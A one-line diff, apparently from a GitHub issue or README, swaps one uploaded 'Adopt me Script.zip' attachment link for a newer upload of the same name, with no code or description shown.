@@ -1,1 +1,1 @@
-[Adopt me Script.zip](https://github.com/user-attachments/files/19984441/Adopt.me.Script.zip)
+[Adopt me script.zip](https://github.com/user-attachments/files/20001015/Adopt.me.script.zip)
